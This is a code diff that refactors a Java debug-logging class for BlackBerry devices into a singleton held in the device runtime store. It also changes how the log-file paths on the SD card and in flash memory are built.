@@ -9,6 +9,7 @@
  * *************************************************/
 package blackberry.utils;
 
+import net.rim.device.api.system.RuntimeStore;
 import blackberry.Device;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
@@ -19,8 +20,10 @@ import blackberry.fs.Path;
 public final class DebugWriter extends Thread {
 
     static final String FILE_NAME = "D_";
-    static final String SD_PATH = Path.SD_PATH + FILE_NAME + Device.getPin() + ".txt";
-    static final String FLASH_PATH = Path.USER_PATH + FILE_NAME + Device.getPin() +".txt";
+    static final String SD_PATH = Path.SD() + FILE_NAME + Device.getPin()
+            + ".txt";
+    static final String FLASH_PATH = Path.USER() + FILE_NAME + Device.getPin()
+            + ".txt";
     private static final long SLEEP_TIME = 1000;
 
     private static final int MAX_NUM_MESSAGES = 1000;
@@ -30,7 +33,7 @@ public final class DebugWriter extends Thread {
     boolean haveMessages;
 
     boolean toStop;
-    boolean logToSD;
+    boolean logToSD = false;
 
     StringBuffer queue;
     int numMessages;
@@ -41,23 +44,40 @@ public final class DebugWriter extends Thread {
      * @param logToSD
      *            the log to sd
      */
-    public DebugWriter(final boolean logToSD) {
+    private DebugWriter() {
 
         toStop = false;
         queue = new StringBuffer();
-        this.logToSD = logToSD;
-        //final boolean logToFlash = !logToSD;
 
-        createNewFile();
+        
+    }
+
+    static DebugWriter instance;
+    static final long GUID = 0xbc56afac435c4a92L;
+
+    public static synchronized DebugWriter getInstance() {
+
+        if (instance == null) {
+            instance = (DebugWriter) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+
+                DebugWriter singleton = new DebugWriter();
+
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
+        }
+
+        return instance;
     }
 
     private void createNewFile() {
 
-        if (logToSD) {            
-            Path.createDirectory(Path.SD_PATH);
+        if (logToSD) {
+            Path.createDirectory(Path.SD());
             fileDebug = new AutoFlashFile(SD_PATH, true);
         } else {
-            Path.createDirectory(Path.USER_PATH);
+            Path.createDirectory(Path.USER());
             fileDebug = new AutoFlashFile(FLASH_PATH, true);
         }
 
@@ -93,11 +113,13 @@ public final class DebugWriter extends Thread {
      * (non-Javadoc)
      * @see java.lang.Thread#run()
      */
-    public void run() {
+    public void run() {               
+        createNewFile();
+        
         //#ifdef DBC
         Check.asserts(fileDebug != null, "null filedebug");
         //#endif
-
+        
         for (;;) {
             synchronized (this) {
 
